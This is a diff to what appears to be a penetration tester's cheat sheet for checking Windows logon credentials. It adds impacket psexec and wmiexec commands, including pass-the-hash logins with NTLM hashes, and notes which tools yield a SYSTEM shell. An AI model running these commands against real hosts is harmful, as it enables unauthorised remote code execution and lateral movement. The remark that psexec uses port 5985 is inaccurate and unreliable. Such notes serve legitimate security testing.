@@ -2,10 +2,18 @@
 
 ## check if win-logon-creds are working
 
-### psexec.py
+Note: psexec & evil-winrm uses 5985 (powershell remote access)
+
+### psexec.py | smbexec | wmiexec
+
+NOTE: psexec, smbexec will give SYSTEM shell. wmiexec will give user shell.
 
 ```bash
 $ python3 /opt/impacket/examples/psexec.py USER:'PASS'@$IP
+$ impacket-psexec DOMAIN/USER@IP -hashes :NTLMHASH
+
+$ impacket-wmiexec DOMAIN/USER@IP -hashes :NTLMHASH
+
 ```
 
 ### evil-winrm
